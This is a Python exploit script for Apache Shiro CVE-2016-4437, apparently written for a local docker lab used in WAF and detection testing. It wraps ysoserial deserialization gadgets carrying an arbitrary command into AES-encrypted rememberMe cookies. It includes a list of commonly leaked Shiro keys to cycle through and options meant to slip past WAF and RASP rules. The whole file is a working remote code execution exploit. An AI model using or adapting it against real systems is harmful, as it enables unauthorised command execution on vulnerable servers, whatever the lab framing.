# -*- coding: utf-8 -*-
"""Shiro CVE-2016-4437（SHIRO-550）exp。

官方 seed：ysoserial CommonsBeanutils1 → Shiro AesCipherService AES 加密 → rememberMe Cookie。
本脚本用 pycryptodome 复刻 shiro AES-128-CBC + 随机 IV 前缀 + base64 的封装。

预留变异旋钮（WAF/RASP 轮用）：
  --key        默认密钥（内置 top 常见 key 列表可遍历）
  --gadget     ysoserial gadget（CommonsBeanutils1 无 CC 依赖 / CC5、CC6 等有依赖链）
  --mode       cbc（shiro 1.2.4 默认）/ gcm（1.4.2+ 形态，供规则差异测试）
  --cookie     cookie 名（默认 rememberMe）
  --pad-n      在 base64 前后填充空白字符（WAF 解析差异测试用）
  --split      按 n 字节切分 cookie（引号续行形态，WAF 轮用）
"""
import argparse
import base64
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from Crypto.Cipher import AES  # noqa: E402

from common import gen_yso, session  # noqa: E402

DEFAULT_KEYS = [
    "kPH+bIxk5D2deZiIxcaaaA==",          # shiro 1.2.4 硬编码（本靶场）
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
    "0AvVhmFLUs0KTA3Kprsdag==",
    "wGiHplamyXlVB11XWanREg==",
    "1QWLxgNyNYa8FKEOJ7PXMQ==",
    "6ZmI6I2j5Y+R5aSn5ZOlAA==",
]


def pkcs5(data):
    n = 16 - len(data) % 16
    return data + bytes([n]) * n


def encrypt_rememberme(ser, key_b64, mode="cbc"):
    key = base64.b64decode(key_b64)
    iv = os.urandom(16)
    if mode == "cbc":
        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pkcs5(ser))
        return base64.b64encode(iv + ct)
    if mode == "gcm":
        c = AES.new(key, AES.MODE_GCM, nonce=iv)
        ct, tag = c.encrypt_and_digest(ser)
        return base64.b64encode(iv + ct + tag)
    raise ValueError(mode)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18083)
    ap.add_argument("--path", default="/")
    ap.add_argument("--key", default=DEFAULT_KEYS[0])
    ap.add_argument("--gadget", default="CommonsBeanutils1")
    ap.add_argument("--cmd", default="touch /tmp/pwn_shiro_r1")
    ap.add_argument("--mode", choices=["cbc", "gcm"], default="cbc")
    ap.add_argument("--cookie", default="rememberMe")
    ap.add_argument("--pad-n", type=int, default=0, help="cookie 值前后填充的空白字符数")
    ap.add_argument("--probe-keys", action="store_true", help="遍历内置 key 列表各发一次（deleteMe 探测）")
    ap.add_argument("--raw-file", default=None, help="跳过 ysoserial 生成，直接加密发送预制 .ser")
    a = ap.parse_args()

    if a.raw_file:
        ser = open(a.raw_file, "rb").read()
        print("[*] 预制载荷 %s (%d bytes) key=%s" % (a.raw_file, len(ser), a.key))
    else:
        out = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "out", "shiro_%s_%d.ser" % (a.gadget, int(time.time())))
        ser = open(gen_yso(a.gadget, a.cmd, out), "rb").read()
        print("[*] 载荷 %s (%d bytes) gadget=%s key=%s" % (out, len(ser), a.gadget, a.key))

    s = session()
    url = "http://%s:%d%s" % (a.host, a.port, a.path)
    keys = DEFAULT_KEYS if a.probe_keys else [a.key]
    for k in keys:
        val = encrypt_rememberme(ser, k, a.mode).decode()
        if a.pad_n:
            pad = "\t" * a.pad_n
            val = pad + val + pad
        r = s.get(url, headers={"Cookie": "%s=%s" % (a.cookie, val)},
                  timeout=30, allow_redirects=False)
        dm = "deleteMe" in r.headers.get("Set-Cookie", "")
        print("[*] GET %s key=%.8s... -> HTTP %s deleteMe=%s (%d bytes)"
              % (url, k, r.status_code, dm, len(r.content)))
    print("[*] 真值核查（另开终端）: docker compose --profile shiro exec shiro ls -l --full-time /tmp")


if __name__ == "__main__":
    main()
